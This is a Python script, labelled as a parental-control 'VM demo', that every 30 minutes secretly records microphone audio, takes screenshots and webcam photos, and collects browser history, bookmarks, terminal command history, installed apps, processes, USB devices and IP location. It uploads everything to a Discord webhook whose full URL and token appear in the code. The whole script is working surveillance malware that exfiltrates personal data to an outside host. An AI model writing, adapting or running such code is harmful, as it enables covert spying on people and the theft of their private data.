import os
import time
import schedule
import requests
import sqlite3
import platform
import json
from datetime import datetime
from PIL import ImageGrab
import cv2
import psutil
import subprocess
from cryptography.fernet import Fernet
import sounddevice as sd  # Para captura de áudio
import scipy.io.wavfile as wav  # Para salvar áudio
import numpy as np

# ==================== CONFIGURAÇÕES ====================
LOG_DIR = "logs"
REPORT_DIR = "relatorios"
AUDIO_DIR = "audios"
MAX_LOG_AGE_DAYS = 7
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1459232383445500128/UysW7g1xigRBIHf1nSv7sjyZL-U6mCW5PGSSNyG-Us5HW4KDhOw1JZLT7O_V-W97fzxS"  # <- SUBSTITUA AQUI
ENCRYPTION_KEY = Fernet.generate_key()
TEMPO_INICIO = time.time()  # Para calcular tempo de uso

# ==================== SETUP ====================
def setup():
    """Cria pastas necessárias e configura criptografia."""
    global cipher_suite
    cipher_suite = Fernet(ENCRYPTION_KEY)
    os.makedirs(LOG_DIR, exist_ok=True)
    os.makedirs(REPORT_DIR, exist_ok=True)
    os.makedirs(AUDIO_DIR, exist_ok=True)
    print("[+] ✅ Pastas criadas com sucesso.")

# ==================== FUNÇÕES AUXILIARES ====================
def salvar_txt(nome_arquivo: str, dados: dict):
    """Salva dados em um arquivo .txt formatado."""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        caminho = os.path.join(REPORT_DIR, f"{nome_arquivo}_{timestamp}.txt")
        
        with open(caminho, "w", encoding="utf-8") as f:
            f.write("=" * 60 + "\n")
            f.write(f"📅 {nome_arquivo.upper()} - {timestamp}\n")
            f.write("=" * 60 + "\n\n")
            
            for chave, valor in dados.items():
                f.write(f"🔹 {chave.upper()}\n")
                f.write("-" * 40 + "\n")
                
                if isinstance(valor, list):
                    for i, item in enumerate(valor, 1):
                        f.write(f"  {i}. {item}\n")
                elif isinstance(valor, dict):
                    for sub_chave, sub_valor in valor.items():
                        f.write(f"  • {sub_chave}: {sub_valor}\n")
                else:
                    f.write(f"  {valor}\n")
                f.write("\n")
        
        print(f"[+] 📄 Arquivo salvo: {caminho}")
        return caminho
    except Exception as e:
        print(f"[-] ❌ Erro ao salvar .txt: {e}")
        return None

def enviar_discord(titulo: str, descricao: str, arquivos: list = None):
    """Envia mensagem para o Discord via webhook."""
    try:
        # Prepara o embed
        embed = {
            "embeds": [{
                "title": titulo,
                "description": descricao[:4000],  # Limite do Discord
                "color": 3447003,
                "timestamp": datetime.utcnow().isoformat(),
                "footer": {"text": "🛡️ Controle Parental"}
            }]
        }
        
        # Envia embed primeiro
        response = requests.post(
            DISCORD_WEBHOOK_URL,
            json=embed,
            headers={"Content-Type": "application/json"}
        )
        
        if response.status_code == 204:
            print("[+] ✅ Mensagem enviada para o Discord!")
        else:
            print(f"[-] ❌ Erro Discord: {response.status_code} - {response.text}")
            return False
        
        # Envia arquivos separadamente (se houver)
        if arquivos:
            for arquivo in arquivos:
                if os.path.exists(arquivo):
                    with open(arquivo, "rb") as f:
                        files = {"file": (os.path.basename(arquivo), f)}
                        resp = requests.post(DISCORD_WEBHOOK_URL, files=files)
                        if resp.status_code == 200:
                            print(f"[+] 📎 Arquivo enviado: {os.path.basename(arquivo)}")
                        else:
                            print(f"[-] ❌ Erro ao enviar arquivo: {resp.status_code}")
        
        return True
    except Exception as e:
        print(f"[-] ❌ Erro ao enviar para Discord: {e}")
        return False

# ==================== 1. TEMPO DE USO DO PC ====================
def obter_tempo_uso():
    """Calcula quanto tempo o PC está ligado desde o início do script."""
    try:
        tempo_atual = time.time()
        tempo_uso_segundos = tempo_atual - TEMPO_INICIO
        
        horas = int(tempo_uso_segundos // 3600)
        minutos = int((tempo_uso_segundos % 3600) // 60)
        segundos = int(tempo_uso_segundos % 60)
        
        # Tempo desde o boot do sistema
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        tempo_desde_boot = datetime.now() - boot_time
        
        resultado = {
            "tempo_sessao": f"{horas}h {minutos}m {segundos}s",
            "tempo_desde_boot": str(tempo_desde_boot).split('.')[0],
            "boot_time": boot_time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        print(f"[+] ⏱️ Tempo de uso: {resultado['tempo_sessao']}")
        return resultado
    except Exception as e:
        print(f"[-] ❌ Erro ao obter tempo de uso: {e}")
        return {"erro": str(e)}

# ==================== 2. CAPTURA DE ÁUDIO ====================
def capturar_audio(duracao=10, sample_rate=44100):
    """Captura áudio do microfone por X segundos."""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        nome_arquivo = os.path.join(AUDIO_DIR, f"audio_{timestamp}.wav")
        
        print(f"[+] 🎤 Gravando áudio por {duracao} segundos...")
        audio = sd.rec(int(duracao * sample_rate), samplerate=sample_rate, channels=1, dtype='int16')
        sd.wait()
        
        wav.write(nome_arquivo, sample_rate, audio)
        print(f"[+] ✅ Áudio salvo: {nome_arquivo}")
        return nome_arquivo
    except Exception as e:
        print(f"[-] ❌ Erro ao capturar áudio: {e}")
        return None

# ==================== 5. DISPOSITIVOS USB ====================
def listar_usb():
    """Lista dispositivos USB conectados."""
    try:
        sistema = platform.system()
        dispositivos = []
        
        if sistema == "Windows":
            # Usa PowerShell para listar dispositivos USB
            comando = 'Get-PnpDevice -Class USB | Select-Object Status, Class, FriendlyName | Format-Table -AutoSize'
            resultado = subprocess.run(
                ["powershell", "-Command", comando],
                capture_output=True, text=True, encoding='utf-8', errors='ignore'
            )
            linhas = resultado.stdout.strip().split('\n')
            dispositivos = [linha.strip() for linha in linhas if linha.strip() and "---" not in linha]
            
        elif sistema == "Linux":
            resultado = subprocess.run(["lsusb"], capture_output=True, text=True)
            dispositivos = resultado.stdout.strip().split('\n')
        
        print(f"[+] 🔌 Dispositivos USB encontrados: {len(dispositivos)}")
        return dispositivos
    except Exception as e:
        print(f"[-] ❌ Erro ao listar USB: {e}")
        return []

# ==================== 6. LOCALIZAÇÃO GEOGRÁFICA ====================
def obter_localizacao():
    """Obtém localização aproximada via IP (API gratuita, sem chave)."""
    try:
        response = requests.get("http://ip-api.com/json/", timeout=10)
        dados = response.json()
        
        if dados["status"] == "success":
            localizacao = {
                "ip": dados.get("query", "Desconhecido"),
                "cidade": dados.get("city", "Desconhecido"),
                "regiao": dados.get("regionName", "Desconhecido"),
                "pais": dados.get("country", "Desconhecido"),
                "isp": dados.get("isp", "Desconhecido"),
                "latitude": dados.get("lat", 0),
                "longitude": dados.get("lon", 0)
            }
            print(f"[+] 📍 Localização: {localizacao['cidade']}, {localizacao['pais']}")
            return localizacao
        return {"erro": "Não foi possível obter localização"}
    except Exception as e:
        print(f"[-] ❌ Erro ao obter localização: {e}")
        return {"erro": str(e)}

# ==================== 9. PROCESSOS EM EXECUÇÃO ====================
def listar_processos():
    """Lista processos em execução com uso de CPU/RAM."""
    try:
        processos = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                info = proc.info
                if info['cpu_percent'] > 0 or info['memory_percent'] > 0.1:
                    processos.append({
                        "pid": info['pid'],
                        "nome": info['name'],
                        "cpu": f"{info['cpu_percent']:.1f}%",
                        "ram": f"{info['memory_percent']:.1f}%"
                    })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        # Ordena por uso de CPU (maior primeiro)
        processos.sort(key=lambda x: float(x['cpu'].replace('%', '')), reverse=True)
        
        # Formata para texto
        processos_txt = [f"{p['nome']} (PID: {p['pid']}) - CPU: {p['cpu']}, RAM: {p['ram']}" for p in processos[:30]]
        
        print(f"[+] 📊 Processos ativos: {len(processos)}")
        return processos_txt
    except Exception as e:
        print(f"[-] ❌ Erro ao listar processos: {e}")
        return []

# ==================== 10. HISTÓRICO DE COMANDOS (TERMINAL) ====================
def obter_historico_terminal():
    """Obtém histórico de comandos do terminal."""
    try:
        sistema = platform.system()
        comandos = []
        
        if sistema == "Windows":
            # Histórico do PowerShell
            ps_history = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt")
            if os.path.exists(ps_history):
                with open(ps_history, "r", encoding="utf-8", errors="ignore") as f:
                    comandos = f.readlines()[-50:]  # Últimos 50 comandos
                    comandos = [cmd.strip() for cmd in comandos if cmd.strip()]
            
        elif sistema == "Linux":
            # Histórico do Bash
            bash_history = os.path.expanduser("~/.bash_history")
            if os.path.exists(bash_history):
                with open(bash_history, "r", encoding="utf-8", errors="ignore") as f:
                    comandos = f.readlines()[-50:]
                    comandos = [cmd.strip() for cmd in comandos if cmd.strip()]
            
            # Histórico do Zsh (se existir)
            zsh_history = os.path.expanduser("~/.zsh_history")
            if os.path.exists(zsh_history):
                with open(zsh_history, "r", encoding="utf-8", errors="ignore") as f:
                    comandos.extend(f.readlines()[-50:])
        
        print(f"[+] 💻 Comandos no histórico: {len(comandos)}")
        return comandos
    except Exception as e:
        print(f"[-] ❌ Erro ao obter histórico do terminal: {e}")
        return []

# ==================== 12. INFORMAÇÕES DO SISTEMA ====================
def obter_info_sistema():
    """Obtém informações detalhadas do sistema."""
    try:
        # CPU
        cpu_info = {
            "processador": platform.processor(),
            "nucleos_fisicos": psutil.cpu_count(logical=False),
            "nucleos_logicos": psutil.cpu_count(logical=True),
            "uso_atual": f"{psutil.cpu_percent()}%"
        }
        
        # Memória RAM
        mem = psutil.virtual_memory()
        ram_info = {
            "total": f"{mem.total / (1024**3):.2f} GB",
            "disponivel": f"{mem.available / (1024**3):.2f} GB",
            "uso": f"{mem.percent}%"
        }
        
        # Disco
        disco = psutil.disk_usage('/')
        disco_info = {
            "total": f"{disco.total / (1024**3):.2f} GB",
            "usado": f"{disco.used / (1024**3):.2f} GB",
            "livre": f"{disco.free / (1024**3):.2f} GB",
            "uso": f"{disco.percent}%"
        }
        
        # Bateria (se disponível)
        bateria_info = {"status": "Não disponível"}
        bateria = psutil.sensors_battery()
        if bateria:
            bateria_info = {
                "percentagem": f"{bateria.percent}%",
                "carregando": "Sim" if bateria.power_plugged else "Não",
                "tempo_restante": f"{bateria.secsleft // 60} min" if bateria.secsleft > 0 else "Calculando..."
            }
        
        # Sistema Operacional
        so_info = {
            "sistema": platform.system(),
            "versao": platform.version(),
            "arquitetura": platform.architecture()[0],
            "hostname": platform.node(),
            "usuario": os.getlogin()
        }
        
        info_completa = {
            "sistema_operacional": so_info,
            "cpu": cpu_info,
            "memoria_ram": ram_info,
            "disco": disco_info,
            "bateria": bateria_info
        }
        
        print(f"[+] 🖥️ Informações do sistema obtidas")
        return info_completa
    except Exception as e:
        print(f"[-] ❌ Erro ao obter info do sistema: {e}")
        return {"erro": str(e)}

# ==================== 15. FAVORITOS DO NAVEGADOR ====================
def obter_favoritos():
    """Obtém favoritos/bookmarks do Chrome e Firefox."""
    try:
        sistema = platform.system()
        favoritos = []
        
        # Chrome
        if sistema == "Windows":
            chrome_bookmarks = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Bookmarks")
        elif sistema == "Linux":
            chrome_bookmarks = os.path.expanduser("~/.config/google-chrome/Default/Bookmarks")
        else:
            chrome_bookmarks = ""
        
        if os.path.exists(chrome_bookmarks):
            with open(chrome_bookmarks, "r", encoding="utf-8") as f:
                dados = json.load(f)
                
                def extrair_bookmarks(node):
                    """Extrai bookmarks recursivamente."""
                    result = []
                    if isinstance(node, dict):
                        if node.get("type") == "url":
                            result.append(f"{node.get('name', 'Sem nome')} - {node.get('url', '')}")
                        if "children" in node:
                            for child in node["children"]:
                                result.extend(extrair_bookmarks(child))
                    return result
                
                # Extrai da barra de favoritos e outros
                roots = dados.get("roots", {})
                for key in roots:
                    favoritos.extend(extrair_bookmarks(roots[key]))
        
        # Firefox (simplificado - places.sqlite é mais complexo)
        if sistema == "Windows":
            firefox_path = os.path.expanduser(r"~\AppData\Roaming\Mozilla\Firefox\Profiles")
        elif sistema == "Linux":
            firefox_path = os.path.expanduser("~/.mozilla/firefox")
        else:
            firefox_path = ""
        
        if os.path.exists(firefox_path):
            for profile in os.listdir(firefox_path):
                places_db = os.path.join(firefox_path, profile, "places.sqlite")
                if os.path.exists(places_db):
                    try:
                        # Copia o DB para evitar lock
                        temp_db = os.path.join(REPORT_DIR, "temp_places.sqlite")
                        import shutil
                        shutil.copy2(places_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("""
                            SELECT moz_bookmarks.title, moz_places.url 
                            FROM moz_bookmarks 
                            JOIN moz_places ON moz_bookmarks.fk = moz_places.id 
                            WHERE moz_bookmarks.type = 1 
                            LIMIT 50
                        """)
                        for titulo, url in cursor.fetchall():
                            if titulo and url:
                                favoritos.append(f"{titulo} - {url}")
                        conn.close()
                        os.remove(temp_db)
                    except Exception as e:
                        print(f"[-] Erro ao ler favoritos Firefox: {e}")
        
        print(f"[+] ⭐ Favoritos encontrados: {len(favoritos)}")
        return favoritos[:100]  # Limita a 100
    except Exception as e:
        print(f"[-] ❌ Erro ao obter favoritos: {e}")
        return []

# ==================== FUNÇÕES EXTRAS (DO CÓDIGO ORIGINAL) ====================
def capturar_tela():
    """Captura screenshot."""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        nome_arquivo = os.path.join(REPORT_DIR, f"tela_{timestamp}.png")
        tela = ImageGrab.grab()
        tela.save(nome_arquivo)
        print(f"[+] 🖼️ Tela capturada: {nome_arquivo}")
        return nome_arquivo
    except Exception as e:
        print(f"[-] ❌ Erro ao capturar tela: {e}")
        return None

def capturar_camera():
    """Captura foto da webcam."""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        nome_arquivo = os.path.join(REPORT_DIR, f"camera_{timestamp}.jpg")
        
        cap = cv2.VideoCapture(0)
        time.sleep(1)
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            cv2.imwrite(nome_arquivo, frame)
            print(f"[+] 📸 Foto capturada: {nome_arquivo}")
            return nome_arquivo
        return None
    except Exception as e:
        print(f"[-] ❌ Erro ao capturar câmera: {e}")
        return None

def obter_historico_navegador():
    """Obtém histórico do navegador."""
    try:
        sistema = platform.system()
        historico = []
        
        if sistema == "Windows":
            chrome_history = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History")
        elif sistema == "Linux":
            chrome_history = os.path.expanduser("~/.config/google-chrome/Default/History")
        else:
            return []
        
        if os.path.exists(chrome_history):
            import shutil
            temp_db = os.path.join(REPORT_DIR, "temp_history.sqlite")
            shutil.copy2(chrome_history, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch') as visit_time
                FROM urls
                ORDER BY last_visit_time DESC
                LIMIT 50
            """)
            
            for url, titulo, data in cursor.fetchall():
                historico.append(f"[{data}] {titulo[:50]} - {url[:80]}")
            
            conn.close()
            os.remove(temp_db)
        
        print(f"[+] 🌐 Histórico: {len(historico)} entradas")
        return historico
    except Exception as e:
        print(f"[-] ❌ Erro ao obter histórico: {e}")
        return []

def obter_apps_instaladas():
    """Obtém lista de apps instaladas."""
    try:
        sistema = platform.system()
        apps = []
        
        if sistema == "Windows":
            import winreg
            paths = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]
            
            for path in paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            nome = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            if nome:
                                apps.append(nome)
                        except:
                            continue
                except:
                    continue
                    
        elif sistema == "Linux":
            resultado = subprocess.run(["dpkg", "--list"], capture_output=True, text=True)
            for linha in resultado.stdout.split('\n')[5:]:
                partes = linha.split()
                if len(partes) >= 2:
                    apps.append(partes[1])
        
        apps = list(set(apps))[:200]  # Remove duplicatas, limita a 200
        print(f"[+] 📦 Apps instaladas: {len(apps)}")
        return apps
    except Exception as e:
        print(f"[-] ❌ Erro ao listar apps: {e}")
        return []

def limpar_logs_antigos():
    """Remove logs com mais de X dias."""
    try:
        agora = time.time()
        limite = agora - (MAX_LOG_AGE_DAYS * 24 * 60 * 60)
        
        for pasta in [LOG_DIR, REPORT_DIR, AUDIO_DIR]:
            if os.path.exists(pasta):
                for arquivo in os.listdir(pasta):
                    caminho = os.path.join(pasta, arquivo)
                    if os.path.getmtime(caminho) < limite:
                        os.remove(caminho)
                        print(f"[+] 🗑️ Removido: {arquivo}")
        
        print("[+] ✅ Limpeza concluída")
    except Exception as e:
        print(f"[-] ❌ Erro na limpeza: {e}")

# ==================== FUNÇÃO PRINCIPAL ====================
def executar_monitoramento():
    """Executa todas as funções de monitoramento."""
    print("\n" + "=" * 70)
    print(f"[+] 🕐 MONITORAMENTO INICIADO - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)
    
    arquivos_gerados = []
    
    # 1. Tempo de uso
    tempo_uso = obter_tempo_uso()
    
    # 2. Captura de áudio (10 segundos)
    audio_arquivo = capturar_audio(duracao=10)
    if audio_arquivo:
        arquivos_gerados.append(audio_arquivo)
    
    # 5. Dispositivos USB
    usb_devices = listar_usb()
    
    # 6. Localização
    localizacao = obter_localizacao()
    
    # 9. Processos
    processos = listar_processos()
    
    # 10. Histórico do terminal
    comandos_terminal = obter_historico_terminal()
    
    # 12. Info do sistema
    info_sistema = obter_info_sistema()
    
    # 15. Favoritos
    favoritos = obter_favoritos()
    
    # Extras
    historico_nav = obter_historico_navegador()
    apps = obter_apps_instaladas()
    
    # Capturas
    tela = capturar_tela()
    if tela:
        arquivos_gerados.append(tela)
    
    camera = capturar_camera()
    if camera:
        arquivos_gerados.append(camera)
    
    # ==================== SALVAR RELATÓRIOS .TXT ====================
    
    # Relatório de histórico do navegador
    if historico_nav:
        arquivo_historico = salvar_txt("historico_navegador", {"entradas": historico_nav})
        if arquivo_historico:
            arquivos_gerados.append(arquivo_historico)
    
    # Relatório de apps instaladas
    if apps:
        arquivo_apps = salvar_txt("apps_instaladas", {"aplicativos": apps})
        if arquivo_apps:
            arquivos_gerados.append(arquivo_apps)
    
    # Relatório de processos
    if processos:
        arquivo_processos = salvar_txt("processos_ativos", {"processos": processos})
        if arquivo_processos:
            arquivos_gerados.append(arquivo_processos)
    
    # Relatório de comandos do terminal
    if comandos_terminal:
        arquivo_terminal = salvar_txt("historico_terminal", {"comandos": comandos_terminal})
        if arquivo_terminal:
            arquivos_gerados.append(arquivo_terminal)
    
    # Relatório de favoritos
    if favoritos:
        arquivo_favoritos = salvar_txt("favoritos_navegador", {"bookmarks": favoritos})
        if arquivo_favoritos:
            arquivos_gerados.append(arquivo_favoritos)
    
    # Relatório de USB
    if usb_devices:
        arquivo_usb = salvar_txt("dispositivos_usb", {"dispositivos": usb_devices})
        if arquivo_usb:
            arquivos_gerados.append(arquivo_usb)
    
    # Relatório completo (resumo)
    relatorio_completo = {
        "tempo_uso": tempo_uso,
        "localizacao": localizacao,
        "info_sistema": info_sistema,
        "resumo": {
            "historico_navegador": f"{len(historico_nav)} entradas",
            "apps_instaladas": f"{len(apps)} apps",
            "processos_ativos": f"{len(processos)} processos",
            "comandos_terminal": f"{len(comandos_terminal)} comandos",
            "favoritos": f"{len(favoritos)} bookmarks",
            "dispositivos_usb": f"{len(usb_devices)} dispositivos"
        }
    }
    arquivo_resumo = salvar_txt("relatorio_completo", relatorio_completo)
    if arquivo_resumo:
        arquivos_gerados.append(arquivo_resumo)
    
    # ==================== ENVIAR PARA DISCORD ====================
    titulo = f"📊 Monitoramento - {datetime.now().strftime('%H:%M')}"
    
    descricao = f"""
**⏱️ Tempo de Uso**
• Sessão: {tempo_uso.get('tempo_sessao', 'N/A')}
• Desde boot: {tempo_uso.get('tempo_desde_boot', 'N/A')}

**📍 Localização**
• {localizacao.get('cidade', 'N/A')}, {localizacao.get('pais', 'N/A')}
• IP: {localizacao.get('ip', 'N/A')}
• ISP: {localizacao.get('isp', 'N/A')}

**🖥️ Sistema**
• SO: {info_sistema.get('sistema_operacional', {}).get('sistema', 'N/A')}
• CPU: {info_sistema.get('cpu', {}).get('uso_atual', 'N/A')}
• RAM: {info_sistema.get('memoria_ram', {}).get('uso', 'N/A')}
• Disco: {info_sistema.get('disco', {}).get('uso', 'N/A')}
• Bateria: {info_sistema.get('bateria', {}).get('percentagem', 'N/A')}

**📈 Resumo**
• 🌐 Histórico: {len(historico_nav)} entradas
• 📦 Apps: {len(apps)} instaladas
• 📊 Processos: {len(processos)} ativos
• 💻 Comandos: {len(comandos_terminal)} no terminal
• ⭐ Favoritos: {len(favoritos)} bookmarks
• 🔌 USB: {len(usb_devices)} dispositivos
• 🎤 Áudio: {'Capturado' if audio_arquivo else 'Não capturado'}
"""
    
    # Envia notificação + arquivos
    sucesso = enviar_discord(titulo, descricao, arquivos_gerados)
    
    if sucesso:
        print("[+] ✅ Notificação enviada com sucesso!")
    else:
        print("[-] ❌ Falha ao enviar notificação")
    
    # Limpeza de logs antigos
    limpar_logs_antigos()
    
    print("\n" + "=" * 70)
    print(f"[+] ✅ MONITORAMENTO CONCLUÍDO - {datetime.now().strftime('%H:%M:%S')}")
    print("=" * 70 + "\n")

# ==================== MAIN ====================
if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║           🛡️  CONTROLE PARENTAL - VM DEMO  🛡️             ║
    ║                                                           ║
    ║  ⚠️  APENAS PARA DEMONSTRAÇÃO TÉCNICA EM VM              ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Setup inicial
    setup()
    
    # Agenda execução a cada 30 minutos
    schedule.every(30).minutes.do(executar_monitoramento)
    
    # Executa imediatamente
    executar_monitoramento()
    
    # Loop principal
    print("[+] 🔄 Aguardando próxima execução (a cada 30 min)...")
    print("[+] 💡 Pressione Ctrl+C para parar\n")
    
    while True:
        schedule.run_pending()
        time.sleep(1)
